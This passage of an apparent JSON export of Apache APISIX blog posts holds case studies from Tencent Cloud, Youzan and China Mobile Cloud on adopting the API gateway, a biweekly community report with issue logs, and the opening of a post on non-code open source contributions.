etcd, etc. are clustered and deployed. Instead of using the Apache APISIX dashboard, Smart Titanium Machine Learning Platform interacts directly with the Admin API and writes directly to etcd.\\n\\n![Add Plugin Process](https://static.apiseven.com/202108/1646830304736-ae479c95-9be7-43b5-8600-bcac8914c08d.png)\\n\\n## Experience Sharing\\n\\nIn the process of doing this, we have summarized some of the pitfalls of using Nginx and discovered some of the advantages of APISIX, which we will briefly share here.\\n\\n### Counterintuitive Nginx Configuration\\n\\nWhen I used Nginx before, I felt that Nginx was a configuration-driven product. Nginx is often counterintuitive when it comes to configuration management. One such counterintuitive pitfall was encountered by my colleague during this hands-on experience:\\n\\n![Nginx Configuration Error](https://static.apiseven.com/202108/1646830304738-224447bd-ee49-4369-9fce-c53d9a828d0e.png)\\n\\nFor those are new to Nginx, these two lines of commands are added before the `if`, and there are no other commands inside the `if` that could override them, so they should be executed. Anyone familiar with Nginx knows that the command inside the `if` overrides the outside command, but this is very counterintuitive.\\n\\n### Test Cases as Documentation\\n\\nIn practicing using Apache APISIX practices, the Apache APISIX project test cases are written in great detail. Even if I didn\u2019t have a deep understanding of how to call certain functions in Apache APISIX, I could often find the answers in the test cases. When I encountered some OpenResty problems later, I would look for the relevant code in these test cases, and I was able to solve the problem every time.\\n\\n![Test Cases as Documentation](https://static.apiseven.com/202108/1646830304739-dcfb66f9-f765-4e15-a476-edea9ca3ff11.png)\\n\\n## Some Thoughts on Service Mesh\\n\\nIn the early stage of technology selection, apart from Envoy, Kong and Apache APISIX, some colleagues also mentioned Service Mesh. Why do we still choose Apache APISIX, given that Service Mesh is also capable of doing this? Isn\u2019t this a regression in technology? On this issue, my view is as follows.\\n\\n1. The API gateway is at the system boundary and handles north-south traffic; the Service Mesh is inside the cluster and handles east-west traffic. The functions of the two are different and cannot be directly compared.\\n\\n1. Service Mesh has proven to have some performance loss. But there is also a voice that says, on the cloud, this loss may not be the performance bottleneck of the business, so this is a matter of opinion.\\n\\n1. Apache APISIX customization development is more efficient thanks to the easy-to-use features of OpenResty and Lua. Even if the development team has no prior development experience with OpenResty or Lua, they can still complete the custom development requirements of the business in a short period of time.\\n\\n1. Apache APISIX is less expensive to deliver than Service Mesh because the Istio community is very active and iterates very quickly, resulting in incompatibility between versions of Istio and versions of Kubernetes. In a customer\u2019s production environment, some Kubernetes clusters may have version differences, and these Kubernetes clusters cannot share a single version of Istio, which can cause some problems in the actual delivery process.\\n\\n## Personal Expectations\\n\\nThanks to Apache APISIX for creating an open source API gateway product that is extremely high performance and easy to use. During the development process of TI-ONE Network, we hope that we can learn more about using it in practice and give feedback to the Apache APISIX community."},{"id":"BiWeekly Report (Aug 30 - Sep 15)","metadata":{"permalink":"/blog/2021/09/15/weekly-report","source":"@site/blog/2021/09/15/weekly-report.md","title":"BiWeekly Report (Aug 30 - Sep 15)","description":"The Apache APISIX community has added features related to the APISIX Dashboard, the Admin API and Control API, and the proxy-mirror plugin in the last two weeks.","date":"2021-09-15T00:00:00.000Z","formattedDate":"September 15, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":4.32,"truncated":true,"authors":[],"prevItem":{"title":"Implementing Apache APISIX in Tencent Cloud TI-ONE Platform","permalink":"/blog/2021/09/16/tencent-cloud"},"nextItem":{"title":"Youzanyun PaaS for comprehensive micro-service governance with APISX","permalink":"/blog/2021/09/14/youzan"}},"content":"> 33 developers have committed 130 commits to Apache APISIX in the last two weeks since 8.30. Thank you to the following people for adding to Apache APISIX (in no particular order), your selfless work makes the Apache APISIX project better!\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has grown as a community since its first day of open source and has quickly become the most active open source API gateway project in the world. These achievements could not have been achieved without the joint efforts of our community partners.\\n\\n\\"The Apache APISIX Community Weekly Newsletter hopes to help community members better grasp the weekly progress of the Apache APISIX community and facilitate your participation in the Apache APISIX community.\\n\\nWe\'ve also put together some issues for those new to the community! If you are interested, don\'t miss them!\\n\\n## Contributor statistics\\n\\nFrom 8.30-9.12, 33 developers submitted 130 commits to Apache APISIX, and we thank the following people for their contributions to Apache APISIX (in no particular order).\\n\\n![contributor](https://static.apiseven.com/202108/1631754498946-7d655f8e-3881-4594-b029-a67189a63ffa.jpg)\\n\\n![committer](https://static.apiseven.com/202108/1631676136968-13216876-e9f6-4852-95b4-6f73db5cb405.30-9)\\n\\n## Good first issue\\n\\n### Issue #4906\\n\\n**Link**: [#4906](https://github.com/apache/apisix/issues/4906)\\n\\n**Problem Description**: When testing Apache APISIX load balancing with two internal domains and adding pass_host: node with active health check enabled, I found that it still routes to the faulty host.\\n\\n```Shell\\nfor i in $(seq 1 1000); do curl  -H \\"Host: httpbin.org\\" ${APISIX_GATEWAY_URL}  ; done\\napple\\napple\\n<html>\\n<head><title>503 Service Temporarily Unavailable</title></head>\\n<body>\\n<center><h1>503 Service Temporarily Unavailable</h1></center>\\n<hr><center>nginx/1.17.7</center>\\n</body>\\n</html>\\napple\\napple\\napple\\n<html>\\n<head><title>503 Service Temporarily Unavailable</title></head>\\n<body>\\n<center><h1>503 Service Temporarily Unavailable</h1></center>\\n<hr><center>nginx/1.17.7</center>\\n</body>\\n</html>\\napple\\napple\\napple\\napple\\napple\\n```\\n\\n### Issue #4945\\n\\n**Link**: [#4945](https://github.com/apache/apisix/issues/4945)\\n\\n**Problem Description**: I am having problems trying to download Apache APISIX version 2.9 on a Macbook with M1 system according to the related guide article. The prompt is as follows.\\n\\n```Apache\\nlualogging 1.5.2-1 depends on luasocket (3.0rc1-2 installed)\\nlualogging 1.5.2-1 is now installed in /Users/juzhiyuan/workspace/apisix-2.9/apache-apisix-2.9-src/deps (license: MIT/X11)\\n\\ncasbin 1.26.0-1 depends on lrexlib-pcre >= 2.9.1 (not installed)\\nInstalling https://luarocks.org/lrexlib-pcre-2.9.1-1.src.rock\\n\\nError: Failed installing dependency: https://luarocks.org/casbin-1.26.0-1.rockspec - Failed installing dependency: https://luarocks.org/lrexlib-pcre-2.9.1-1.src.rock - Could not find header file for PCRE\\n  No file pcre.h in /usr/local/include\\n  No file pcre.h in /usr/include\\n  No file pcre.h in /include\\nYou may have to install PCRE in your system and/or pass PCRE_DIR or PCRE_INCDIR to the luarocks command.\\nExample: luarocks install lrexlib-pcre PCRE_DIR=/usr/local\\nmake: *** [deps] Error 1\\n```\\n\\n## Recent feature highlights\\n\\n- [referer-restriction support for configuring blacklist and message](https://github.com/apache/apisix/pull/4916)(contributor: okaybase)\\n- [node_listen and admin_listen support richer configuration forms](https://github.com/apache/apisix/pull/4856)(contributor: wayne-cheng), [additional reference](https://github.com/apache/apisix/pull/4967)\\n- [admin-api support for returning stream type plugin information](https://github.com/apache/apisix/pull/4947)(Contributor: spacewander)\\n- [Support for configuring fallback SNI](https://github.com/apache/apisix/pull/5000)(Contributed by spacewander)\\n- [proxy-mirror support for scaled mirror requests](https://github.com/apache/apisix/pull/4965)(Contributor: okaybase)\\n- [Control API adds dump routing configuration](https://github.com/apache/apisix/pull/5011)(Contributor: Zheaoli)\\n- [dashboard Support Service Discovery Configuration](https://github.com/apache/apisix-dashboard/pull/2081)(Contributor: bzp2010)\\n- [dashboard Route advanced configuration conditions support built-in parameter configuration](https://github.com/apache/apisix-dashboard/pull/1984)(contributor: lookbrook)\\n- [dashboard Upstream support for Keepalive Pool configuration](https://github.com/apache/apisix-dashboard/pull/2117)(Contributor: bzp2010)\\n\\nThe Apache APISIX project website and the issue on Github have accumulated a wealth of documentation and experience, if you encounter problems you can read the documentation, search in the issue with keywords, and also participate in the discussion on the issue to put forward their ideas and practical experience.\\n\\n## Recent Blog Posts Recommended\\n\\n- [Apache APISIX Community Weekly Report \uff5c 2021 8.23-8.29](https://apisix.apache.org/blog/2021/08/30/weekly-report/)\\n\\n  \\"The Apache APISIX Community Weekly Report hopes to help community members better grasp the weekly progress of the Apache APISIX community and facilitate your participation in the Apache APISIX community.\\n\\n- [Apache APISIX Delivers a Better Gateway and K8S Ingress Controller for KubeSphere](https://apisix.apache.org/blog/2021/08/31/Apache%20APISIX%20%C3%97%20KubeSphere-a-better-gateway-and-K8S-Ingress-Controller/)\\n\\n  This article describes how to deploy APISIX and APISIX Ingress Controller directly in KubeSphere. APISIX can be used to carry business traffic by acting as a gateway, or a data plane for APISIX Ingress Controller.\\n\\n- [Heard you have something to say about Apache APISIX? Here\'s your chance](https://apisix.apache.org/blog/2021/09/15/weekly-report/)\\n\\n  We invite you to participate in the Apache APISIX User Survey, and your feedback will directly influence our future development. We will randomly select a number of lucky stars who will have a chance to win a small gift from the Apache APISIX community!\\n\\n- [Using Apache APISIX and Okta for Authentication](https://apisix.apache.org/blog/2021/08/16/Using-the-Apache-APISIX-OpenID-Connect-Plugin-for-Centralized-Authentication/)\\n\\n  This article describes how to use Apache APISIX to configure Okta authentication to switch from traditional authentication mode to centralized authentication mode, getting rid of multiple accounts, multiple passwords, duplicate authentication and other pain points faced by many developers.\\n\\n## About Apache APISIX\\n\\nApache APISIX is a dynamic, real-time, high-performance open source API gateway that provides rich traffic management features such as load balancing, dynamic upstream, canary release, service meltdown, authentication, observability, etc. Apache APISIX helps enterprises quickly and securely handle API and microservice traffic, including gateways, Kubernetes Ingress and Service Grid.\\n\\nApache APISIX has been used by hundreds of enterprises worldwide to handle business-critical traffic, including finance, Internet, manufacturing, retail, carriers, and more, such as NASA, the European Union\'s Digital Factory, China Airlines, China Mobile, Tencent, Huawei, Weibo, NetEase, Shell, 360, Taikang, and Nespresso Tea.\\n\\nMore than 200 contributors have come together to create Apache APISIX, the world\'s most active open source gateway project. Smart developers! Come join this active and diverse community and come together to bring more good things to the world!\\n\\n- [Apache APISIX GitHub](https://github.com/apache/apisix)\\n- [Apache APISIX Website](https://apisix.apache.org/)\\n- [Apache APISIX Docs](https://apisix.apache.org/zh/docs/apisix/getting-started)"},{"id":"Youzanyun PaaS for comprehensive micro-service governance with APISX","metadata":{"permalink":"/blog/2021/09/14/youzan","source":"@site/blog/2021/09/14/youzan.md","title":"Youzanyun PaaS for comprehensive micro-service governance with APISX","description":"This article introduces how Youzan cloud-native PaaS platform uses cloud-native API gateway Apache APISIX as a product traffic gateway and the benefits it brings.","date":"2021-09-14T00:00:00.000Z","formattedDate":"September 14, 2021","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":7.52,"truncated":true,"authors":[{"name":"Nuojing Dai"}],"prevItem":{"title":"BiWeekly Report (Aug 30 - Sep 15)","permalink":"/blog/2021/09/15/weekly-report"},"nextItem":{"title":"How APISIX implemented in China Mobile Cloud","permalink":"/blog/2021/09/13/china-mobile-cloud-usercase"}},"content":"> This article focuses on the enterprise case of using Apache APISIX for PaaS platform with Youzanyun native platform and how to use Apache APISIX as a specific example of the product traffic gateway.\\n\\n\x3c!--truncate--\x3e\\n\\nYouzan is a major retail technology SaaS provider that helps businesses open online stores, engage in social marketing, improve retention and repurchase, and expand new retail across all channels. This year, youzan Technologies is beginning to design and implement a new cloud native PaaS platform with a common model for release management and micro-service related governance of various applications. Apache APISIX played a key role.\\n\\n## Why Need a Traffic Gateway\\n\\n### Youzan OPS Platform\\n\\nYouzan OPS platform is based on FLASK in the early single application, mainly to support business-oriented. It gradually went online and deployed a lot of business-side code into the containerization phase. At that time, the gateway was only a part of the function of the internal flash application, and there was no clear concept of the gateway, only as the traffic forwarding function of business application. The following illustration shows the current Gateway 1.0 business structure.\\n\\n![1.0 business structure](https://static.apiseven.com/202108/1646730623405-a0e0b22b-40ca-49c2-bd9b-fd77547bc404.png)\\n\\nAs the entire system in the early days mainly focused on the direction of the business, so did not generate too much momentum to carry out the transformation. From 2018 onwards, through internal communication, we found that if there is not a good gateway layer governance, the subsequent product function and business access will bring more and more obvious bottlenecks.\\n\\n### Issues with no-gateway Layer Governance\\n\\n#### Performance\\n\\n1. Every time you add a back-end service, you need to make a coding change\\n2. The traffic forwarding code is implemented simply in Python and is not designed as a \u201cGateway\u201d\\n3. The performance limitations of the FLASK framework are limited to 120-150 QPS per machine\\n4. Repeat the wheel: each of the different business requirements produces a set of corresponding entrances\\n5. It\u2019s messy. It\u2019s complicated\\n\\nBased on this problem, our action direction is: the professional work to the professional system to do.\\n\\n#### Internal Operational Aspects\\n\\n![Internal problems](https://static.apiseven.com/202108/1646730664670-a57a07d3-4a10-4201-9455-410e1d05428d.png)\\n\\n1. The number of internal services to manage is very high (hundreds)\\n2. Some services do not dock with CAS implementation authentication\\n3. The cost of new service docking CAS exists, and the repeated development is time-consuming and labor-consuming\\n4. All services are configured directly at the access layer, with no internal service specifications or best practices\\n\\nWith these two aspects of the problem, we began to gateway products related research.\\n\\n## Why Apache APISIX\\n\\nWe also initially investigated a number of gateway systems, such as Apache APISIX, Kong, Traefik and MOSN, as well as two related projects within our company, YZ7 and Tether.\\n\\n![Gateway pre-section](https://static.apiseven.com/202108/1631607308093-b2135819-6d17-41d4-b2fb-10cbefa3c27b.png)\\n\\nConsidering the maturity and extensibility of the product, we finally made a choice between Kong and Apache APISIX.\\n\\n![Multi-dimensional comparison](https://static.apiseven.com/202108/1646793171947-28500d69-44c3-4afe-9808-e21b30265aad.png)\\n\\nAs you can see from the image above, the two are basically the same in many ways, so the storage side has become a key consideration. Because etcd is mature in our company\u2019s internal operation and maintenance system, Apache APISIX is a little better than Kong.\\n\\nAt the same time, considering the open source project level, Apache APISIX\u2019s domestic communication and follow-up processing speed is very good, the project\u2019s plug-in system is rich and comprehensive, for each phase of the use of the type are relatively consistent.\\n\\nSo after research in 2020, [Apache APISIX](https://github.com/apache/apisix)  was finally chosen as the gateway for the upcoming cloud native PaaS platform in Youzan.\\n\\n## After Using Apache APISIX\\n\\nWhen we started accessing Apache APISIX, the two problems mentioned above were solved one by one.\\n\\n### Effect 1: Optimized Architecture Performance\\n\\nApache APISIX is deployed as an entry point to gateway at the edge of the internal service area, through which all requests to the front end pass. At the same time, we use the plug-in function of Apache APISIX to connect with the company\u2019s internal CAS single sign-on system. At the same time in the front end we provide a responsible for authentication SDK Apache APISIX authentication interface docking, to achieve a complete and automated process system.\\n\\n![Optimized architecture](https://static.apiseven.com/202108/1646730763458-7c60675d-4edf-4e4b-9d8b-c3619679af58.png)\\n\\nSo the problem was solved:\\n\\n1. Each time you add a new back-end service, you simply call the Apache APISIX interface and write the new service configuration\\n2. Traffic forwarding is done through Apache APISIX, which is excellent at what the gateway does\\n3. The gateway is no longer a performance bottleneck in the architecture\\n4. For different business requirements, you can use the same gateway to achieve uniformity; business details vary, you can achieve through plug-ins\\n\\n### Effect 2: Internal Service Access Standardization\\n\\nAfter accessing Apache APISIX, the company\u2019s new internal service will have its own authentication function, access costs are very low, business can directly start to develop business code. At the same time when the new service access, according to the norms of internal services for the relevant routing configuration, back-end services can be unified access authentication after the user identity, save time and effort.\\n\\nSome of the fine-tuning details of the in-house service are briefly described here.\\n\\n#### Authentication Plugin OPS-JWT-Auth\\n\\nThe authentication plug-in is developed based on JWT-Auth protocol. When a user accesses the front end, the front end calls the SDK first to get the available JWT-Token locally. Then through the following path to get the user\u2019s valid information, placed in the front-end of a storage, complete login authentication.\\n\\n![Login authentication](https://static.apiseven.com/202108/1646730872779-8ca9bc05-a3ea-4cc5-95dc-b8b2a8e3e2d1.png)\\n\\n#### Deployment Configuration Upgrade\\n\\nAt the deployment level, we implemented the current multi-cluster configuration deployment after three iterations from the simpler version.\\n\\n- Version 1: Double Room 4 independent nodes, the hypervisor is written to each node\u2019s etcd\\n- Version 2: Double Room 4 independent nodes, the main room three nodes etcd cluster\\n- Version 3: Three Rooms 6 independent nodes, three rooms etcd cluster\\n\\nFor now we\u2019re going to mix computing with storage deployment, and then we\u2019re going to deploy a really high availability ETCD cluster that can be isolated from the governance plane Apache APISIX runtime, deploy in stateless mode.\\n\\n#### New Authentication Plugin PAT-Auth\\n\\nThis year we added the Person Access Token (Pat) authentication plug-in, which, like calling the Open API on GitHub, generates a personal Token that can call the Open API as a Person.\\n\\nBecause our own operating platform also has some such requirements, for example, some local development plug-ins need to personally access the interface on the cloud platform, in this case the personal way Token is more convenient, allow developers to license themselves.\\n\\nWhile multiple Auth plug-ins have been supported since Apache APISIX 2.2, one Consumer can now run multiple Auth plug-in scenario implementations.\\n\\n## More Plans to Explore\\n\\n### Upgrade Operations Automation\\n\\nWe also experienced a few version changes during our use of Apache APISIX. But each upgrade, more or less because of compatibility and lead to the transformation of development, after the completion of the online changes, operating efficiency is low. So in the future we will try to deploy a three-room etcd cluster on the storage surface at the same time as Apache APISIX runs the surface containerization implementation for automatic distribution.\\n\\n### Use the Traffic Split Plugin\\n\\n[traffic split](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/traffic-split.md) is a plug-in that Apache APISIX has introduced in recent releases with the primary function of traffic separation. With this plug-in, we can according to some of the traffic head characteristics, use it to complete the relevant operations automatically.\\n\\n![traffic split](https://static.apiseven.com/202108/1631607412159-bc84d447-ef28-4726-8ee1-b960415ac5ce.png)\\n\\nAs shown above, a traffic split plug-in is introduced in the routing configuration, and when region = Region1 is present, it is routed to Upstream1. Through such a rule configuration, the operation of traffic control is completed.\\n\\n### East-west Flow Management\\n\\nIn our usage scenario, we are more involved in multi-service of intranet, and we can rely on Apache APISIX for traffic management when calling authentication. Both service A and service B can use it to call service C, with the addition of an authenticated plug-in to set its call object scope, environment scope, or rate, and fuse limit, etc. , to do something like this.\\n\\n![Flow management](https://static.apiseven.com/202108/1631607435661-c22c61c4-396b-4412-9643-b6ccb16cfb1c.png)\\n\\n### With the Internal Access System\\n\\nThen we\u2019re going to Dock Apache Apisix with the company\u2019s permission system, and after authentication, determine if the user has access to a resource on the back end, the administrator of the permissions only needs to make a uniform configuration on the administration plane.\\n\\n![System docking](https://static.apiseven.com/202108/1646730958671-7a7dff8f-7b4a-4488-ae31-e99bb06dc7f3.png)\\n\\nOne of the benefits of this is that all back-end services do not need to be individually managed, since all current traffic is handled through the gateway layer.\\n\\n### Go Plugin Development\\n\\nApache APISIX currently supports multiple computing languages at the computing language level, such as Java, Go, and Python. It just so happens that our recently implemented cloud native PaaS platform is also starting to move the technology stack from Python to Go.\\n\\nHopefully we will be able to update some of the plug-ins we have implemented with Go in the future with Apache APISIX, hopefully bringing more benefits to the like product in subsequent iterations."},{"id":"How APISIX implemented in China Mobile Cloud","metadata":{"permalink":"/blog/2021/09/13/china-mobile-cloud-usercase","source":"@site/blog/2021/09/13/china-mobile-cloud-usercase.md","title":"How APISIX implemented in China Mobile Cloud","description":"This article introduces how China Mobile Cloud develops products and improves and updates its functions based on the cloud-native API gateway Apache APISIX.","date":"2021-09-13T00:00:00.000Z","formattedDate":"September 13, 2021","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":7.725,"truncated":true,"authors":[{"name":"Yanshan Chen"}],"prevItem":{"title":"Youzanyun PaaS for comprehensive micro-service governance with APISX","permalink":"/blog/2021/09/14/youzan"},"nextItem":{"title":"How can I contribute to an open source project without writing code?","permalink":"/blog/2021/09/09/how-to-contribute-to-an-openSource-without-coding"}},"content":"> This article is compiled from a presentation given by Yanshan Chen from China Mobile Cloud Competence Center at ApacheCon 2021 Asia. By reading this article, you can learn how China Mobile Cloud is developing and improving and updating its products based on Apache APISIX to create a better mobile cloud object storage.\\n\\n\x3c!--truncate--\x3e\\n\\n## Background Information\\n\\nAs the builder of China Mobile\u2019s cloud facilities, provider of cloud services and aggregator of cloud ecology, China Mobile\u2019s Cloud Competence Center has assumed six major responsibilities for mobile cloud: technology research and development, planning and construction, operation and maintenance, cooperation and introduction, sales support, and support for cloud deployment.\\n\\nAs of October 2020, a total of 25 public cloud nodes have been built nationwide, with a provincial coverage rate of over 80%. Among them, object storage EOS, as one of the underlying infrastructure capabilities, has been deployed in all resource pools, and the overall available scale has reached EB level.\\n\\nMobile cloud object storage has gone through four generations of development history changes. Starting from self-research and development, through functional expansion, deep customization, performance improvement to the latest generation has a cross-regional global correction and deletion architecture, to achieve the effect of off-site multi-live disaster recovery. Throughout the years, it can be said that the progress is rapid.\\n\\nIn the early stage of cloud object storage technology selection, we investigated many API gateways, including Nginx, Apache APISIX, etc., and finally chose Apache APISIX, which can not only meet the current business requirements, but also provide more ideas and choices for our products in terms of system availability and maintainability, which is similar to that of Apache APISIX. The overall product evolution plan and technology stack are more compatible.\\n\\n## Why Did We Choose Apache APISIX as a Gateway?\\n\\n### Why Did We Abandon Nginx?\\n\\n#### Reason 1: Lack of Overall Capabilities\\n\\nApache APISIX as a microservice gateway, compared with other API gateways, its upstream routing plugins are fully dynamic, and no restart is required to modify the configuration. The plugin also supports hot-loading, so you can plug and unplug and modify the plugin at any time. These capabilities are not available in Nginx, especially in scenarios with very high business continuity requirements.\\n\\n#### Reason 2: Inflexible Configuration\\n\\nApache APISIX supports all-platform, multi-protocol, fully dynamic, fine-grained routing, security protection, and is O&M friendly, and can be docked to Prometheus, SkyWalking, etc., with highly scalable These are the capabilities that are needed in real production.\\n\\n### Why Did We Choose Apache APISIX?\\n\\n#### Reason 1: Based on the Need for Product Architecture\\n\\nAs mentioned earlier, object storage has now gone through four generations of development. With the richness of the product features, the scale of the entire architecture cluster becomes larger, there is a need for more control surface policies, including traffic governance, service governance and other policies to ensure the stable operation of the entire system.\\n\\n#### Reason 2: Implementation of Fine-grained Business Functions\\n\\nApache APISIX features, functional plugins, and custom development capabilities are available to meet our business needs during subsequent development.\\n\\n#### Reason 3: SLA Service Level Guarantee\\n\\nThe general SLA service level availability emphasizes two metrics: system mean time to failure and system mean time to repair failure. How to effectively lengthen the system mean time to failure? How to effectively reduce the system mean time to repair? These two questions are our key considerations. Apache APISIX has good traffic management and service management related capabilities in both fault isolation and self-healing.\\n\\n![SLA Service Level](https://static.apiseven.com/202108/1631500451210-60ba58d6-1fc4-4db6-b658-5e0066bb1c9b.png)\\n\\n## What Did We Change in Apache APISIX Data Plane?\\n\\n### Improvement 1: Separate Access for Internal and External Network Requests\\n\\nCurrently our business model has two domains, the intranet domain and the extranet domain. The intranet domain name access is the east-west access of the resource pool, such as the internal virtual machine of the resource pool, application platform class products, etc. The extranet domain name is equivalent to pure public network access, such as: public cloud, toC and toB customers in the public network, accessing object storage via satellite or physical private line.\\n\\nBy accessing Apache APISIX, we realize multi-domain certificate configuration for internal and external domain names, and provide encrypted access function, and realize the function of dynamic loading of SSL certificate. For 24-hour uninterrupted business, it is very important to be able to dynamically update SSL certificate.\\n\\n### Improvement 2: Request for Fuse Protection\\n\\nHere we first give you a brief description of the current Object Storage EOS node management after accessing Apache APISIX. The entire object store is divided into a data plane and a control plane. The data plane mainly carries the I/O flow of the whole business. The business data is processed from APISIX\u2019s Layer 7 traffic governance module as the entry point, through the APISIX back-end upstream Accesser, which is the main module for business interface processing.\\n\\n![Fuse Protection](https://static.apiseven.com/202108/1646731748455-69e4da37-1a58-4303-968e-3a636e308d04.png)\\n\\nThe control plane has several main services, including the autopilot service Manager, the observable system Observer, and the chaos engineering fault injection module Checker. there is also an additional overall interaction orchestration system Orchestrator and a canary release platform Publisher.\\n\\n![Control Plane Services](https://static.apiseven.com/202108/1646731771583-36c98076-1434-4bb6-820d-41de725223bf.png)\\n\\nIn order to achieve request fusion protection, the data plane is connected to Apache APISIX to achieve the processing capability of request intervention. The observable system at the control plane is mainly built based on Prometheus, which collects indicators and alerts, and finally realizes the overall fusion protection at the back-end.\\n\\n### Improvement 3: Customize Constant Key to Achieve Global Flow-limit\\n\\nlimit-conn key This plugin mainly supports remote_addr, server_addr, X-Forwarded-For, X-Real-IP, but cannot do full limit flow for north-south gateway traffic.\\nIn order to match our business requirements, we customize a constant constant as the range of imit-conn key. The right side of the above figure is the modified configuration after accessing Apache APISIX, and the constant constant constant key is used to achieve the function of global flow-limit.\\n\\n![Global Flow-limit](https://static.apiseven.com/202108/1646731806833-166c115f-26bb-4657-a7c1-9a24e043f399.png)\\n\\n### Improvement 4: New Function Feature Switches\\n\\n#### Switch 1: Temporarily Turn off an Object Storage Function\\n\\nIn the gateway layer by accessing Apache APISIX, it is compatible with the S3 interface specification to avoid wasting resources on the access layer and persistence layer of the back-end service.\\n\\n#### Switch 2: Support the Highest Priority for GET Requests\\n\\nWith the support of GET request priority, GET requests have the highest priority when retrieving user data, higher than PUT, DELETE and other requests.\\n\\n#### Switch 3: Return 501 Not Implemented for Ordered List Requests\\n\\nIn the object storage will generally have a bucket of Ordered List feature requirements. The third and fourth generation of mobile cloud object storage for tens of billions of file objects, if still using Ordered List, on the one hand, request access to the back-end response time will be particularly long, on the other hand, will take up more resources, the stability of the back-end a greater challenge.\\n\\nTherefore, after accessing Apache APISIX, the request will be rejected directly at the gateway level, and the status code of 501 Not Implemented will be returned.\\n\\n### Improvement 5: Transparent Upgrade/Expansion/Configuration Change\\n\\nCombined with the Apache APISIX Layer 7 governance capabilities, we perform upgrades, scaling and configuration changes to key components upstream and across the I/O path to control back-end weighting through dynamic scaling and dynamic upgrade operations for subsequent request processing.\\n\\n### Improvement 6: Request Log Tracking Analysis Based on Request-id\\n\\nBased on access.log, we have implemented a centralized log collection management method to collect APISIX logs and logs of other processes, and then perform a comprehensive analysis.\\n\\n![Log Tracking](https://static.apiseven.com/202108/1646731841734-478f5fe5-186c-4d1e-b754-009ba4942ead.png)\\n\\nThe configuration item on the right side of the image above uses the request-id plugin of Apache APISIX. Each request is assigned a request-id when it passes through APISIX, which is used in the business logic processing layer (Accesser) and the data persistence layer, which in turn filters out the log timestamps of the different components in the official Loki panel and helps to automate some analysis using AI later.\\n\\n### Improvement 7: Cross Available Zones Request Scheduling Feature\\n\\nThe backend of the current load balancing is a seven-layer traffic governance layer based on APISIX implementation, which achieves multi-live capability by equal ECMP + BGP routing. We define three traffic types, each APISIX node receives service traffic and only hits the upstream service of this node to process (level0, purple line), similar to SideCar mode.\\nIf a node has a problem upstream, it will be forwarded to other upstream nodes in the same AZ for processing (green line). If all upstream nodes hang, the ability to invoke requests across AZs (level2, red line) is implemented based on Apache APISIX, which writes the requests to other AZs and finally achieves request scheduling across AZs.\\n\\n![Cross Available Zones Request Scheduling](https://static.apiseven.com/202108/1646731904721-e1b2a9ee-0f3c-41da-8a6b-c20a027df1b6.png)\\n\\n## Future Plans\\n\\nThe future of mobile cloud object storage will fully embrace cloud-native, and gradually achieve the following plans:\\n\\n1. Integrate data surface functions, and eventually achieve a comprehensive containerized deployment orchestration.\\n\\n1. Successively access the APISIX-based Ingress Controller, through APISIX to unify access portal.\\n\\n1. Strengthen the integration capability with Autopilot Manager and Observer subsystem to further achieve fault isolation and self-healing.\\n\\n1. Move the authentication capability of object storage S3 to the interface layer. Better achieve unified authentication and security access to protect the back-end effect."},{"id":"2021/09/09/how-to-contribute-to-an-openSource-without-coding","metadata":{"permalink":"/blog/2021/09/09/how-to-contribute-to-an-openSource-without-coding","source":"@site/blog/2021/09/09/how-to-contribute-to-an-OpenSource-without-coding.md","title":"How can I contribute to an open source project without writing code?","description":"You can participate in open source projects by writing articles, making videos, sharing them externally, building local communities.","date":"2021-09-09T00:00:00.000Z","formattedDate":"September 9, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":6.715,"truncated":true,"authors":[{"name":"Ruofei Zhao","url":"https://github.com/Serendipity96","imageURL":"https://avatars.githubusercontent.com/u/23514812?v=4"}],"prevItem":{"title":"How APISIX implemented in China Mobile Cloud","permalink":"/blog/2021/09/13/china-mobile-cloud-usercase"},"nextItem":{"title":"Centralized Authentication with Apache APISIX and Advanced Tricks","permalink":"/blog/2021/09/07/how-to-use-apisix-auth"}},"content":"> This article describes many ways to contribute to open source projects without writing code. You can get involved in open source projects by writing articles, making videos, sharing them externally, building local communities, and participating actively in community discussions.\\n\\n\x3c!--truncate--\x3e\\n\\nI have contributed several PRs and submitted several issues to open source projects, and I still remember clearly the excitement when my first PR was merged a few years ago, and I experienced the fun of participating in open source. But my experience remains in the contributor stage with no further progress, because I changed my position from front-end developer to marketing. I am afraid that I would be less familiar with the code,  and I can not fix the bug, which will result in no contribution to the project.\\n\\nThere is a misunderstanding here, not only contributing code and fixing bugs are contributions to the project. Is the only way to become a contributor is to contribute code? **If I can\'t write code and I\'m not a developer, how can I become a contributor to an open source project and even get promoted to committer?** If I don\'t know how to write code and am not a developer, how can I become a contributor to an open source project or even be promoted to committer?\\n\\nAfter I sorted it out, I found that there are many ways to become a contributor, so I\'ll share them here. (The author is also on the way to practice)\\n\\n## Contributing without Coding\\n\\n### Writing articles\\n\\nWriting articles is an easily overlooked way to promote and evangelize a technology. For example, writing a project\'s induction guide, a pit-stop record, an architectural design analysis, implementation principles, etc.\\n\\nIf it is difficult to start writing articles, you can start with translation, either from Chinese to English or from English to Chinese, as long as the content is meaningful to the project, you are contributing to it.\\n\\nOr if you have watched others\' technical practical sharing, organize others\' sharing into a text version and share it to the community to help more people understand the project.\\n\\nI have also noticed that some contributors have put together a development booklet, or a professional book, to systematically introduce a technology to others.\\n\\n### Making videos\\n\\nMaking videos is also a good way to do this. We can convert the text into a video, introduce an open source project in a video way, record a guide, step in the record, architecture design analysis, implementation principles and so on. I also saw a lot of projects using video presentation, the video may be the form of animation, may also be a real person to explain, no matter which, the video presentation will be more vivid and interesting than the text some.\\n\\nHowever, the pre-editing video for newcomers to the workload may be relatively large.\\n\\n### Conference sharing\\n\\nIf you are not shy and like to share outside, then going to technical conferences to share and preach open source projects is also a very good choice. This may be difficult for newcomers who understand the project, with time, when we progress from the little white to familiar, go to share is easier to reach. Sharing can exercise their own expression skills, logical thinking skills, but also exercise their own guts ~ (may also harvest the olive branch)\\n\\n### Improve the documentation\\n\\nMost developers do not like to write documentation, but documentation is an important way for other people to understand the project and get started with the project. I once in the development experience, if you encounter a clear and detailed documentation, I feel very lucky thing, get started on the project will be much faster. Documentation is not limited to start-up 